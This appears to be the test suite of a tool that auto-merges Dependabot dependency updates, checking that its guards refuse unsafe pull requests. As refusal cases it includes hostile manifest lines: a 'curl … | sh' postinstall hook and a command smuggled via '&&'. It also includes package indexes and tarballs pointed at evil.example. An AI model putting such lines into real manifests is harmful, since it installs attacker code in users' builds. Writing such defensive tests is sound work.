# SPDX-FileCopyrightText: 2026 José M. Requena Plens
# SPDX-License-Identifier: MIT
"""landing.py: each guard refuses the pull request it is there for, and nothing lands past one."""

from __future__ import annotations

import copy
import json
import subprocess
import unittest
from typing import Any
from unittest import mock

from kit_fixtures import ecosystem, landing, run_form

SLUG = "kleidos-dev/boards"
HEAD, NEW_HEAD, MAIN = "a" * 40, "b" * 40, "c" * 40
OWNER = "someone"
BRANCH = "dependabot/pip/x-1.3.0"
GATE = {
    "name": landing.GATE,
    "status": "completed",
    "conclusion": "success",
    "app": {"id": landing.ACTIONS_APP},
}
MESSAGE = (
    "Bump x from 1.2.0 to 1.3.0\n\n---\nupdated-dependencies:\n- dependency-name: x\n"
    "  dependency-version: 1.3.0\n  update-type: version-update:semver-minor\n...\n"
)


def commit(message: str = MESSAGE, **more: Any) -> dict[str, Any]:
    return {
        "sha": HEAD,
        "author": {"login": landing.BOT},
        "committer": {"login": "web-flow"},
        "parents": [{"sha": MAIN}],
        "commit": {"message": message, "verification": {"verified": True, "reason": "valid"}},
        **more,
    }


def pull(**more: Any) -> dict[str, Any]:
    repo = {"full_name": SLUG, "default_branch": "main"}
    return {
        "number": 7,
        "title": "Bump x",
        "draft": False,
        "html_url": "https://x/7",
        "user": {"login": landing.BOT, "type": "Bot"},
        "head": {"sha": HEAD, "ref": BRANCH, "repo": dict(repo)},
        "base": {"ref": "main", "repo": dict(repo)},
        **more,
    }


def changed(
    name: str = "requirements.txt", patch: str = "@@\n-x==1\n+x==2", **more: Any
) -> dict[str, Any]:
    return {"filename": name, "status": "modified", "patch": patch, **more}


def push(actor: str = landing.BOT, after: str = HEAD, kind: str = "push") -> dict[str, Any]:
    return {"activity_type": kind, "actor": {"login": actor}, "after": after}


class RefusalTest(unittest.TestCase):
    def why(
        self,
        of: dict[str, Any] | None = None,
        commits: list[dict[str, Any]] | None = None,
        files: list[dict[str, Any]] | None = None,
        pushes: list[dict[str, Any]] | None = None,
    ) -> str:
        return str(
            landing.refusal(
                of or pull(),
                [commit()] if commits is None else commits,
                [changed()] if files is None else files,
                [push(kind="branch_creation")] if pushes is None else pushes,
                OWNER,
            )
        )

    def test_a_bots_minor_update_is_accepted(self) -> None:
        self.assertEqual(self.why(), "None")

    def test_who_opened_it_and_where_it_is(self) -> None:
        fork = {"full_name": "x/boards", "default_branch": "main"}
        here = {"full_name": SLUG, "default_branch": "main"}
        for of, needle in (
            (pull(user={"login": OWNER, "type": "User"}), "opened by someone"),
            (pull(user={"login": "dependabot", "type": "User"}), "opened by dependabot"),
            (pull(user={"login": landing.BOT, "type": "User"}), "opened by dependabot[bot]"),
            (pull(user={"login": "renovate[bot]", "type": "Bot"}), "opened by renovate"),
            (pull(draft=True), "a draft"),
            (pull(head={"sha": HEAD, "repo": fork}), "not in this repository"),
            (pull(head={"sha": HEAD, "repo": None}), "not in this repository"),
            (pull(base={"ref": "v2", "repo": here}), "against v2, not the default branch"),
        ):
            with self.subTest(needle=needle):
                self.assertIn(needle, self.why(of))

    def test_who_wrote_the_commits(self) -> None:
        unsigned = commit()
        unsigned["commit"]["verification"] = {"verified": False, "reason": "unsigned"}
        for one, needle in (
            (unsigned, "is not signed by GitHub (unsigned)"),
            (commit(author={"login": OWNER}), "is someone's"),
            (commit(author={"login": "coderabbitai[bot]"}), "is coderabbitai[bot]'s"),
            (commit(author=None), "is None's"),
            (commit(committer={"login": OWNER}), "was not made on GitHub (someone)"),
            (commit(committer=None), "was not made on GitHub (None)"),
            (
                commit(author={"login": "app[bot]"}, parents=[{}, {}]),
                "is app[bot]'s",
            ),
        ):
            with self.subTest(needle=needle):
                self.assertIn(needle, self.why(commits=[commit(), one]))
        self.assertIn(f"commit {HEAD[:7]} ", self.why(commits=[unsigned]))

    def test_the_merge_of_its_own_update_is_accepted(self) -> None:
        merge = commit("Merge main", author={"login": OWNER}, parents=[{}, {}])
        self.assertEqual(self.why(commits=[commit(), merge]), "None")
        self.assertIn("is someone's", self.why(commits=[commit("x", author={"login": OWNER})]))

    def test_a_foreign_commit_is_caught_wherever_it_is(self) -> None:
        for foreign in (
            commit(author={"login": "app[bot]"}),
            commit(author={"login": OWNER}),
            commit(committer={"login": "someone"}),
        ):
            for at in range(3):
                commits = [commit(), commit()]
                commits.insert(at, foreign)
                with self.subTest(at=at):
                    self.assertNotEqual(self.why(commits=commits), "None")
                    self.assertIn(f"commit {HEAD[:7]}", self.why(commits=commits))

    def test_who_pushed_to_its_branch(self) -> None:
        for pushes, needle in (
            ([push(kind="branch_creation"), push()], "None"),
            ([push(OWNER), push(after=MAIN)], "None"),
            ([push(), push("app[bot]", MAIN)], "push of its branch by app[bot]"),
            ([push("app[bot]", MAIN), push()], "push of its branch by app[bot]"),
            ([push("other", kind="force_push")], "force_push of its branch by other"),
            ([{"activity_type": "push", "actor": None, "after": HEAD}], "by None"),
            ([push(after=MAIN)], "its head is not on the record"),
            ([], "its head is not on the record"),
            ([push()] * 100, "too many pushes"),
            ([push()] * 99, "None"),
        ):
            with self.subTest(needle=needle):
                self.assertIn(needle, self.why(pushes=pushes))

    def test_which_files_are_read(self) -> None:
        sha = "d" * 40
        uses = f"@@\n-      - uses: a/b@{HEAD} # v1\n+      - uses: a/b@{sha} # v2"
        rev = "@@\n-    rev: v3.0.0\n+    rev: v3.1.0"
        json_patch = '@@\n-    "x": "1.0.0"\n+    "x": "1.0.1"'
        workflows = "proves nothing about a change under .github/"
        for one, needle in (
            (changed(), "None"),
            (changed("requirements-dev.in"), "None"),
            (changed("quality/requirements-tools.txt"), "None"),
            (changed("pyproject.toml", '@@\n-  "x==1",\n+  "x==2",'), "None"),
            (changed("a/package.json", json_patch), "None"),
            (changed("package-lock.json", json_patch), "None"),
            (changed(".github/workflows/ci.yml", uses), workflows),
            (changed(".github/requirements.txt"), workflows),
            (changed(".github/workflows/x", status="added"), workflows),
            (changed(".pre-commit-config.yaml", rev), "is no manifest"),
            (changed("action.yml", uses), "is no manifest"),
            (changed("scripts/deploy.sh.in"), "is no manifest"),
            (changed("Makefile.in"), "is no manifest"),
            (changed("requirements.txt/x.py"), "is no manifest"),
            (changed("requirements.txt.sh"), "is no manifest"),
            (changed("xrequirements.txt"), "is no manifest"),
            (changed("pyproject.toml.x"), "is no manifest"),
            (changed("pyprojectxtoml"), "is no manifest"),
            (changed("requirementsxtxt"), "is no manifest"),
            (changed("packagexjson", json_patch), "is no manifest"),
            (changed("xpyproject.toml"), "is no manifest"),
            (changed("xpackage.json", json_patch), "is no manifest"),
            (changed("package.json.js", json_patch), "is no manifest"),
            (changed("pnpm-lock.yaml"), "is no manifest"),
            (changed("pnpm-workspace.yaml"), "is no manifest"),
            (changed("uv.lock"), "is no manifest"),
            (changed("src/main.py"), "is no manifest"),
            (changed("requirements.txt", ""), "shows no diff"),
            (changed("requirements.txt", patch="@@ -1 +1 @@\n context"), "shows no diff"),
            ({"filename": "requirements.txt", "status": "modified"}, "shows no diff"),
            (changed("requirements.txt", status="added"), "is added"),
            (changed("requirements.txt", status="renamed"), "is renamed"),
        ):
            with self.subTest(file=one["filename"]):
                for files in ([changed(), one], [one, changed()]):
                    self.assertIn(needle, self.why(files=files))

    def lines(self, name: str, old: list[str], new: list[str]) -> bool:
        """Whether those lines in place of these are only versions."""
        patch = "\n".join(["@@ -1 +1 @@", " x", *(f"-{o}" for o in old), *(f"+{n}" for n in new)])
        return landing.file_refusal(changed(name, patch)) is None

    def test_what_a_line_of_requirements_may_change(self) -> None:
        one, two, three = (f"    --hash=sha256:{c * 64}" for c in "abc")
        for old, new, accepted in (
            (["x==1.0"], ["x==1.1"], True),
            (["x==1.0"], ["x==1.1.post1"], True),
            (["x[a]==1.0 ; python_version < '3.9'"], ["x[a]==1.1 ; python_version < '3.9'"], True),
            (["x==1.0 \\", one], ["x==1.1 \\", two], True),
            (["x==1.0 \\", one], ["x==1.1 \\", f"{two} \\", three], True),
            (["x==1.0 \\", f"{one} \\", two], ["x==1.1 \\", three], True),
            (["x==1.0", "    # via y"], ["x==1.1", "    # via z", "    # more"], True),
            (["x>=1,<2"], ["x>=1.5,<2"], True),
            (["x==1.0", "y==1"], ["x==1.1", "y==2"], True),
            (["x==1.0"], ["y==1.1"], False),
            (["x==1.0"], ["x>=1.1"], False),
            (["x==1.0"], ["x"], False),
            (["x==1.0"], ["x[evil]==1.1"], False),
            (["x==1.0"], ["x==1.1", "y==1.0"], False),
            (["x==1.0", "y==1.0"], ["x==1.1"], False),
            (["x==1.0", "y==1.0"], ["y==1.1", "x==1.1"], False),
            (["x==1.0"], ["x==1.1 --index-url https://evil.example"], False),
            (["x==1.0"], ["x==1.1", "--extra-index-url https://evil.example/simple"], False),
            (["x==1.0"], ["x @ https://evil.example/x-1.1.tar.gz"], False),
            (["x==1.0"], ["-r evil.txt"], False),
            (["x==1.0"], ["-e ."], False),
            (["x==1.0 \\", one], ["x==1.1"], False),
            ([f"x==1.0{one}"], [f"x==1.0{two}"], False),
            (["x==1.0 \\", one], ["x==1.1 \\", "    --hash=md5:" + "a" * 32], False),
            (["x==1.0 ; python_version < '3.9'"], ["x==1.1"], False),
            ([], ["y==1.0"], False),
            (["x==1.0"], [], False),
        ):
            with self.subTest(old=old, new=new):
                self.assertIs(self.lines("requirements.txt", old, new), accepted)

    def test_what_a_line_of_pyproject_may_change(self) -> None:
        for old, new, accepted in (
            (['dependencies = ["x==1", "y>=2"]'], ['dependencies = ["x==2", "y>=3"]'], True),
            (['requires = ["setuptools==80"]'], ['requires = ["setuptools==81"]'], True),
            ([], ["[tool.pytest.ini_options]", 'addopts = "-p evil"'], False),
            (['build-backend = "a"'], ['build-backend = "evil"'], False),
            (['  "x==1",'], ['  "x @ https://evil.example/x==2",'], False),
        ):
            with self.subTest(old=old, new=new):
                self.assertIs(self.lines("pyproject.toml", old, new), accepted)

    def test_what_a_line_of_npm_may_change(self) -> None:
        def entry(version: str = "1.0.0", host: str = "registry.npmjs.org", **of: str) -> list[str]:
            name = of.get("name", "@a/b-2")
            base = name.rpartition("/")[2]
            return [
                f'    "node_modules/{name}": {{',
                f'      "version": "{version}",',
                f'      "resolved": "https://{host}/{name}/-/{base}-{version}.tgz",',
                f'      "integrity": "{of.get("hash", "sha512")}-{of.get("fill", "A") * 86}==",',
            ]

        def sha(fill: str, more: str = "") -> str:
            return f'"integrity": "sha512-{fill * 86}=="{more}'

        def ranges(value: str) -> list[str]:
            return [f'        "undici-types": "{value}"']

        for old, new, accepted in (
            (entry(), entry("1.1.0", fill="B"), True),
            (entry(), entry("1.1.0-rc.1", fill="+"), True),
            (entry(), entry("1.1.0-rc.1", fill="/"), True),
            ([sha("A")], [sha("B")], True),
            ([sha("A", ', "x": 1')], [sha("B", ', "x": 1')], False),
            ([sha("A").replace("==", "=")], [sha("B").replace("==", "=")], False),
            (ranges(">=7.24.0 <7.24.7"), ranges("~8.9.0"), True),
            (ranges("^1.0.0"), ranges("^1.1.0 || >= 2"), True),
            (ranges("1.0.0 - 2.0.0"), ranges("*"), True),
            (['    "x": "1.0.0",'], ['    "x": "1.0.1"'], False),
            (entry(), entry("1.1.0", "evil.example"), False),
            (entry(), entry("1.1.0", "registry.npmjs.org.evil.example"), False),
            (entry(), entry("1.1.0", name="@a/evil"), False),
            (entry(), entry("1.1.0", hash="sha1"), False),
            (entry(), entry("1.1.0")[:3], False),
            (entry(), [*entry("1.1.0"), '      "hasInstallScript": true,'], False),
            (entry(), [*entry("1.1.0"), '      "license": "other",'], False),
            (['      "license": "MIT",'], ['      "license": "BUSL-1.1",'], False),
            (ranges("1.0.0"), ranges("npm:evil@1.0.0"), False),
            (ranges("1.0.0"), ranges("git+ssh://git@evil.example/x"), False),
            (ranges("1.0.0"), ranges("file:../evil"), False),
            (ranges("1.0.0"), ranges("evil/x"), False),
            (ranges("1.0.0"), ranges("latest"), False),
            (ranges("1.0.0"), ['        "evil": "1.0.0"'], False),
            ([], ['    "postinstall": "curl https://evil.example/x | sh",'], False),
            (['    "test": "vitest"'], ['    "test": "evil"'], False),
            (['    "test": "1"'], ['    "test": "1 && evil"'], False),
            (["      # x"], ["      # y"], False),
        ):
            with self.subTest(old=old, new=new):
                self.assertIs(self.lines("package.json", old, new), accepted)
                self.assertIs(self.lines("package-lock.json", old, new), accepted)

    def test_a_floor_or_an_index_is_never_landed(self) -> None:
        """What a check holds the code to, and where packages come from, are a person's to move."""
        for name, old, new in (
            ("pyproject.toml", "fail_under = 90", "fail_under = 50"),
            ("pyproject.toml", "fail-under = 90", "fail-under = 0"),
            ("pyproject.toml", 'addopts = "--cov-fail-under=90"', 'addopts = "--cov-fail-under=9"'),
            ("pyproject.toml", 'requires-python = ">=3.12"', 'requires-python = ">=3.9"'),
            ("pyproject.toml", 'requires-python = ">=3.12,<4"', 'requires-python = ">=3.9,<4"'),
            ("pyproject.toml", 'python_requires = ">=3.12"', 'python_requires = ">=3.8"'),
            ("pyproject.toml", "[[tool.uv.index]]", "[[tool.uv.index]]  # moved"),
            (
                "requirements.txt",
                "--index-url https://pypi.org/simple",
                "--index-url https://10.0.0.1/simple",
            ),
            ("requirements.txt", "--index-url=10.0.0.1", "--index-url=10.0.0.2"),
            ("requirements.txt", "-i https://a.example:1/simple", "-i https://a.example:2/simple"),
            (
                "requirements.in",
                "--extra-index-url https://a.example/1",
                "--extra-index-url https://a.example/2",
            ),
            (
                "requirements.txt",
                "--find-links https://a.example/1",
                "--find-links https://a.example/2",
            ),
            ("requirements.txt", "--trusted-host 10.0.0.1", "--trusted-host 10.0.0.2"),
            ("requirements.txt", "-c constraints-1.txt", "-c constraints-2.txt"),
            ("package.json", '    "node": ">=20",', '    "node": ">=16",'),
            ("package.json", '    "npm": ">=10"', '    "npm": ">=6"'),
            ("package.json", '    "pnpm": ">=9"', '    "pnpm": ">=8"'),
            ("package.json", '    "yarn": ">=4"', '    "yarn": ">=1"'),
            ("package.json", '    "bun": ">=1.1"', '    "bun": ">=1.0"'),
            ("package.json", '  "engines": { "node": ">=20" },', '  "engines": { "node": ">=8" },'),
            (
                "package.json",
                '    "registry": "https://registry.npmjs.org/"',
                '    "registry": "https://a.example/"',
            ),
            (
                "package.json",
                '  "packageManager": "pnpm@9.0.0",',
                '  "packageManager": "pnpm@8.0.0",',
            ),
            # Poetry's and uv's spellings of a floor.
            ("pyproject.toml", 'python = "<4,>=3.12"', 'python = "<4,>=3.8"'),
            ("pyproject.toml", 'required-version = ">=0.5,<1"', 'required-version = ">=0.5,<0.1"'),
            ("pyproject.toml", "Fail_Under = 90", "Fail_Under = 10"),
        ):
            version = '  "x==1",' if name == "pyproject.toml" else "x==1"
            if name == "package.json":
                version = '    "a": "^1.0.0",'
            bumped = (
                version.replace("1", "2", 1) if name != "package.json" else '    "a": "^1.1.0",'
            )
            first = f"@@ -1 +1 @@\n-{version}\n+{bumped}"
            floor = f"@@ -40 +40 @@\n-{old}\n+{new}"
            for patch in (
                floor,
                f"{first}\n{floor}",
                f"{first}\n context\n{floor[floor.index(chr(10)) + 1 :]}",
            ):
                with self.subTest(name=name, old=old, patch=patch.count("@@")):
                    why = landing.file_refusal(changed(name, patch))
                    self.assertEqual(
                        why, f"{name} changes a floor or a package index: {new.strip()[:80]}"
                    )
            with self.subTest(name=name, only="the version"):
                self.assertIsNone(landing.file_refusal(changed(name, first)))

    def test_a_floor_a_lock_records_for_a_dependency_moves_with_it(self) -> None:
        patch = (
            '@@\n-      "version": "1.0.0",\n+      "version": "1.1.0",'
            '\n-        "node": ">=14"\n+        "node": ">=18"'
        )
        self.assertIsNone(landing.file_refusal(changed("package-lock.json", patch)))
        self.assertIsNotNone(landing.file_refusal(changed("package.json", patch)))

    def test_only_a_packages_own_version_is_masked(self) -> None:
        for line, masked in (
            ("x==1.0", "x==…"),
            ("x[a,b] >= 1.0", "x[a,b] >= …"),
            ('  "x>=1,<2",', '  "x>=…,<…",'),
            ("fail_under = 90", "fail_under = 90"),
            ("--cov-fail-under=90", "--cov-fail-under=90"),
            ('requires-python = ">=3.12"', 'requires-python = ">=3.12"'),
            ("x = 1", "x = 1"),
            ("--index-url=10.0.0.1", "--index-url=10.0.0.1"),
            ("x>=1, <2, !=1.5", "x>=…, <…, !=…"),
            ('python = "<4,>=3.12"', 'python = "<4,>=3.12"'),
            ('required-version = ">=0.5,<1"', 'required-version = ">=0.5,<1"'),
            ("--x==1", "--x==1"),  # an option's value, not a package's version
            ("zope.interface==5.0", "zope.interface==…"),
        ):
            with self.subTest(line=line):
                self.assertEqual(landing.masked(line, landing.PYTHON), masked)

    def test_a_floor_taken_away_is_never_landed(self) -> None:
        for name, line in (
            ("pyproject.toml", "fail_under = 90"),
            ("requirements.txt", "--index-url https://pypi.org/simple"),
            ("package.json", '    "node": ">=20",'),
        ):
            with self.subTest(name=name):
                why = landing.file_refusal(changed(name, f"@@ -40 +40 @@\n-{line}"))
                self.assertEqual(why, f"{name} changes a floor or a package index: {line.strip()}")

    def test_a_version_in_package_json_is_one_of_a_package_the_update_names(self) -> None:
        """Every child of engines is a floor, whatever the engine: no update names it."""
        names = frozenset({"a", "@b/c"})
        for old, new, refused in (
            ('    "a": "^1.0.0",', '    "a": "^1.1.0",', ""),
            ('    "@b/c": "~2.0.0"', '    "@b/c": "~2.1.0"', ""),
            ('    "vscode": "^1.90.0"', '    "vscode": "^1.0.0"', "vscode"),
            ('    "deno": ">=2",', '    "deno": ">=1",', "deno"),
            ('  "version": "1.0.0",', '  "version": "1.0.1",', "version"),
            ('    "b": "^1.0.0",', '    "b": "^1.1.0",', "b"),
        ):
            with self.subTest(new=new):
                patch = f"@@ -1 +1 @@\n-{old}\n+{new}"
                why = landing.file_refusal(changed("package.json", patch), names)
                wanted = f"changes {refused}, which no update of it names: {old.strip()}"
                self.assertEqual(why, f"package.json {wanted}" if refused else None)
                self.assertIsNone(landing.file_refusal(changed("package-lock.json", patch), names))
        patch = '@@\n-    "vscode": "^1.90.0"\n+    "vscode": "^1.0.0"'
        self.assertIn("changes vscode", self.why(files=[changed("package.json", patch)]))
        patch = '@@\n-    "x": "^1.2.0"\n+    "x": "^1.3.0"'
        self.assertIsNone(
            landing.refusal(pull(), [commit()], [changed("package.json", patch)], [push()], OWNER)
        )

    def test_a_scoped_package_dependabot_quotes_is_named(self) -> None:
        """Dependabot quotes a scoped name in its commit (kleidos-dev/cla#1): the name is inside."""
        message = (
            "Bump @types/node from 22.19.1 to 22.19.2 in /worker\n\n"
            "Bumps [@types/node](https://github.com/DefinitelyTyped/DefinitelyTyped) "
            "from 22.19.1 to 22.19.2.\n\n---\nupdated-dependencies:\n"
            '- dependency-name: "@types/node"\n  dependency-version: 22.19.2\n'
            "  dependency-type: direct:development\n"
            "  update-type: version-update:semver-patch\n...\n\n"
            "Signed-off-by: dependabot[bot] <support@github.com>\n"
        )
        patch = '@@\n-    "@types/node": "^22.19.1",\n+    "@types/node": "^22.19.2",'
        files = [changed("worker/package.json", patch)]
        self.assertIsNone(landing.refusal(pull(), [commit(message)], files, [push()], OWNER))
        for name, named in (
            ('"@types/node"', True),
            ("'@types/node'", True),
            ("@types/node", True),
            ('"@types/node', False),
            ("\"@types/node'", False),
            ('"@types/other"', False),
        ):
            with self.subTest(name=name):
                text = message.replace('"@types/node"', name, 1)
                why = landing.refusal(pull(), [commit(text)], files, [push()], OWNER)
                if named:
                    self.assertIsNone(why)
                else:
                    self.assertIn("changes @types/node, which no update of it names", str(why))

    def test_lines_apart_are_compared_apart(self) -> None:
        for patch, accepted in (
            ("@@\n-x==1\n+x==2\n y==1\n-z==1\n+z==2", True),
            ("@@\n-x==1\n c\n+x==2", False),
            ("@@\n-x==1\n y==1\n+z==2\n@@\n-z==1\n+x==2", False),
            ("@@\n-x==1\n\\ No newline at end of file\n+x==2\n\\ No newline", True),
        ):
            with self.subTest(patch=patch):
                self.assertIs(landing.file_refusal(changed(patch=patch)) is None, accepted)

    def test_what_is_said_of_a_line(self) -> None:
        patch = "@@\n-x==1\n+x==2\n+--index-url evil " + "y" * 99
        why = str(landing.file_refusal(changed(patch=patch)))
        self.assertTrue(
            why.startswith(
                "requirements.txt changes a floor or a package index: --index-url evil y"
            ),
            why,
        )
        self.assertLess(len(why), 140)
        self.assertIn("a version: x==…", str(landing.file_refusal(changed(patch="@@\n-x==1"))))
        moved = landing.file_refusal(changed(patch="@@\n-x==1\n-y==1\n+y==1\n+x==1"))
        self.assertIn("a version: x==…", str(moved))

    def test_what_the_versions_are(self) -> None:
        def update(*levels: str) -> str:
            return "".join(
                f"- dependency-name: {n}\n  update-type: version-update:semver-{level}\n"
                for n, level in enumerate(levels)
            )

        for message, needle in (
            (update("minor"), "None"),
            (update("patch", "minor", "patch"), "None"),
            (update("major"), "holds a major"),
            (update("patch", "major"), "holds a major"),
            ("Bump x", f"commit {HEAD[:7]} does not say"),
            (update("minor").replace("  update-type", "update-type"), "does not say"),
            (update("minor").replace("- dependency", " - dependency"), "does not say"),
            (update("minor").replace("semver-minor", "semver-minor x"), "does not say"),
            (update("minor") + "- dependency-name: y\n", "does not say"),
            (update("minor") + "  update-type: version-update:semver-minor\n", "does not say"),
            ("", "does not say"),
        ):
            with self.subTest(message=message):
                self.assertIn(needle, self.why(commits=[commit(message)]))

    def test_each_commit_says_its_own_versions(self) -> None:
        for commits in ([commit(), commit("Bump y")], [commit("Bump y"), commit()]):
            self.assertIn("does not say", self.why(commits=commits))
        major = MESSAGE.replace("minor", "major")
        for commits in ([commit(), commit(major)], [commit(major), commit()]):
            self.assertIn("holds a major", self.why(commits=commits))

    def test_a_merge_commit_says_nothing_of_the_versions(self) -> None:
        merge = commit(MESSAGE, author={"login": OWNER}, parents=[{}, {}])
        self.assertIn("does not say", self.why(commits=[commit("Bump x"), merge]))

    def test_what_is_too_large_or_empty(self) -> None:
        self.assertIn("too large", self.why(commits=[commit()] * 100))
        self.assertIn("too large", self.why(files=[changed()] * 100))
        self.assertEqual(self.why(commits=[commit()] * 99, files=[changed()] * 99), "None")
        self.assertIn("changes nothing", self.why(files=[]))
        self.assertIn("changes nothing", self.why(commits=[]))


class CheckStateTest(unittest.TestCase):
    def run_of(self, name: str = "CI", event: str = "pull_request", **more: Any) -> dict[str, Any]:
        done = {"status": "completed", "conclusion": "success"}
        return {"name": name, "event": event, **done, **more}

    def test_the_states(self) -> None:
        ci = self.run_of()
        bot = self.run_of("App", "")
        gate = dict(GATE)
        none = f"no {landing.GATE} of GitHub Actions succeeded on it"
        for workflows, checks, state in (
            ([ci], [gate], "green"),
            ([ci], [bot, gate], "green"),
            ([ci, self.run_of("Docs", conclusion="skipped")], [gate], "green"),
            ([], [bot, gate], "pending"),
            ([self.run_of("CI", "push")], [bot, gate], "pending"),
            ([self.run_of(status="in_progress", conclusion=None)], [gate], "pending"),
            ([ci, self.run_of("B", status="queued", conclusion=None)], [gate], "pending"),
            ([ci], [gate, {**bot, "status": "in_progress", "conclusion": None}], "pending"),
            ([self.run_of(conclusion="failure")], [gate], "failing: CI"),
            ([self.run_of(conclusion="cancelled")], [gate], "failing: CI"),
            ([ci], [gate, {**bot, "conclusion": "timed_out"}], "failing: App"),
            ([self.run_of(conclusion="action_required")], [gate], "failing: CI"),
            ([self.run_of(conclusion="skipped")], [bot], none),
            ([ci], [], none),
            ([ci], [bot], none),
            ([ci], [{**gate, "conclusion": "skipped"}], none),
            ([ci], [{**gate, "conclusion": "neutral"}, gate], none),
            ([ci], [{**gate, "conclusion": "failure"}], f"failing: {landing.GATE}"),
            ([ci], [{**gate, "name": "✅ Check "}], none),
            ([ci], [{**gate, "app": {"id": 1}}], none),
            ([ci], [{**gate, "app": None}], none),
            ([ci], [gate, {**gate, "app": {"id": 1}, "conclusion": "skipped"}], "green"),
            ([ci, self.run_of("D", "push", conclusion="neutral")], [gate], "green"),
        ):
            with self.subTest(state=state, workflows=workflows, checks=checks):
                self.assertEqual(landing.check_state(workflows, checks), state)

    def test_the_gate_is_the_kits(self) -> None:
        self.assertEqual(landing.GATE, run_form.GATE)
        self.assertEqual(landing.ACTIONS_APP, 15368)


class FakeApi(landing.Api):
    """GitHub as one pull request, its branch a commit behind main."""

    def __init__(self, behind: int = 1) -> None:
        self.behind = behind
        self.pull = pull()
        self.commits = [commit()]
        self.files = [changed()]
        self.pushes = [push(), push(OWNER, NEW_HEAD)]
        self.checks = [dict(GATE)]
        self.ahead = 0
        self.runs: list[dict[str, Any]] = [
            {"name": "CI", "event": "pull_request", "status": "completed", "conclusion": "success"}
        ]
        self.puts: list[tuple[str, dict[str, str]]] = []
        self.gets: list[str] = []
        self.later: list[dict[str, Any]] = []
        self.refuse = ""

    def get(self, path: str) -> Any:
        self.gets.append(path)
        if self.refuse and self.refuse in path:
            raise landing.ApiError("refused")
        base = f"repos/{SLUG}"
        if path == "user":
            return {"login": OWNER}
        if path.startswith(f"{base}/pulls?"):
            return [{"number": 7}]
        if path == f"{base}/pulls/7":
            return copy.deepcopy(self.pull)
        if path.startswith(f"{base}/pulls/7/commits"):
            return copy.deepcopy(self.commits)
        if path.startswith(f"{base}/pulls/7/files"):
            return copy.deepcopy(self.files)
        if path.startswith(f"{base}/activity?ref="):
            assert path.endswith("?ref=refs%2Fheads%2Fdependabot%2Fpip%2Fx-1.3.0&per_page=100"), (
                path
            )
            return self.pushes
        if path == f"{base}/compare/main...{MAIN}":
            return {"ahead_by": self.ahead}
        if path == f"{base}/commits/main":
            return {"sha": MAIN}
        if path.startswith(f"{base}/compare/{MAIN}..."):
            return {"behind_by": self.behind}
        if path.startswith(f"{base}/actions/runs?head_sha={self.pull['head']['sha']}"):
            return {"workflow_runs": self.runs}
        if path.startswith(f"{base}/commits/{self.pull['head']['sha']}/check-runs"):
            return {"check_runs": self.checks}
        raise AssertionError(f"not asked for: {path}")

    def put(self, path: str, fields: dict[str, str]) -> Any:
        self.puts.append((path, fields))
        return {}


class LanderTest(unittest.TestCase):
    def setUp(self) -> None:
        self.api = FakeApi()
        self.said: list[str] = []
        self.slept: list[float] = []

    def sleep(self, seconds: float) -> None:
        """Time passes: GitHub makes the merge commit of an updated branch."""
        self.slept.append(seconds)
        if any("update-branch" in p for p, _f in self.api.puts):
            self.api.pull["head"]["sha"] = NEW_HEAD
        for change in self.api.later[:1]:
            self.api.later.pop(0)
            for name, value in change.items():
                setattr(self.api, name, value)

    def lander(self, merge: bool = True) -> landing.Lander:
        return landing.Lander(self.api, merge, self.sleep, self.said.append)

    def land(self, merge: bool = True, only: list[str] | None = None) -> int:
        declared = ecosystem.load()
        chosen = [SLUG] if only is None else only
        return landing.land(declared, chosen, merge, self.lander(merge))

    def merged(self) -> list[dict[str, str]]:
        return [fields for path, fields in self.api.puts if path.endswith("/merge")]

    def test_it_updates_waits_and_merges_that_head(self) -> None:
        self.assertEqual(self.land(), 0)
        self.assertEqual(
            self.api.puts,
            [
                (f"repos/{SLUG}/pulls/7/update-branch", {"expected_head_sha": HEAD}),
                (f"repos/{SLUG}/pulls/7/merge", {"merge_method": "squash", "sha": NEW_HEAD}),
            ],
        )
        self.assertEqual(self.said, [f"landed: {SLUG}#7 Bump x: https://x/7"])

    def test_a_branch_on_todays_main_is_not_updated(self) -> None:
        self.api.behind = 0
        self.land()
        self.assertEqual(self.merged(), [{"merge_method": "squash", "sha": HEAD}])
        self.assertEqual(len(self.api.puts), 1)

    def test_without_merge_it_only_says(self) -> None:
        self.assertEqual(self.land(merge=False), 0)
        self.assertEqual(self.api.puts, [])
        self.assertEqual(self.said, [f"would land: {SLUG}#7 Bump x"])

    def test_a_guard_that_fails_leaves_it(self) -> None:
        self.api.files = [changed("src/x.py")]
        self.land()
        self.assertEqual(self.api.puts, [])
        self.assertIn("is no manifest", self.said[0])

    def test_the_pushes_are_asked_for(self) -> None:
        self.api.pushes = [push("app[bot]", NEW_HEAD), push()]
        self.land()
        self.assertEqual(self.api.puts, [])
        self.assertIn("push of its branch by app[bot]", self.said[0])

    def test_a_merge_of_something_else_is_left(self) -> None:
        merge = commit("Merge", author={"login": OWNER}, parents=[{"sha": HEAD}, {"sha": MAIN}])
        for ahead, merged in ((1, 0), (0, 1)):
            self.api = FakeApi()
            self.said.clear()
            self.api.commits, self.api.ahead = [commit(), merge], ahead
            self.land()
            self.assertEqual(len(self.merged()), merged)
            if ahead:
                self.assertIn(f"commit {HEAD[:7]} merges what is not on main", self.said[0])

    def test_without_the_gate_it_is_left(self) -> None:
        self.api.checks = []
        self.land()
        self.assertEqual(self.merged(), [])
        self.assertIn(f"no {landing.GATE} of GitHub Actions", self.said[0])

    def test_a_red_run_leaves_it(self) -> None:
        self.api.runs[0]["conclusion"] = "failure"
        self.land()
        self.assertEqual(self.merged(), [])
        self.assertEqual(self.said, [f"left: {SLUG}#7 Bump x: failing: CI"])

    def test_it_waits_for_the_run_to_end(self) -> None:
        running: list[dict[str, Any]] = [
            {**self.api.runs[0], "status": "in_progress", "conclusion": None}
        ]
        done = self.api.runs
        self.api.runs = running
        self.api.later = [{}, {}, {"runs": done}]
        self.land()
        self.assertEqual(len(self.merged()), 1)
        self.assertEqual(self.slept, [landing.POLL_SECONDS] * 3)

    def test_it_does_not_wait_for_ever(self) -> None:
        self.api.runs = []
        self.land()
        self.assertEqual(self.merged(), [])
        self.assertEqual(self.said, [f"left: {SLUG}#7 Bump x: pending"])
        self.assertEqual(sum(self.slept), landing.WAIT_SECONDS)

    def test_the_whole_of_its_bound_is_waited(self) -> None:
        self.api.runs, self.api.behind = [], 0
        for bound, polls in ((20, 1), (21, 2), (40, 2), (41, 3)):
            self.slept.clear()
            with mock.patch.object(landing, "WAIT_SECONDS", bound):
                self.land()
            self.assertEqual(len(self.slept), polls, bound)

    def test_a_branch_that_never_updates_is_left(self) -> None:
        with mock.patch.object(self, "sleep", self.slept.append):
            self.land()
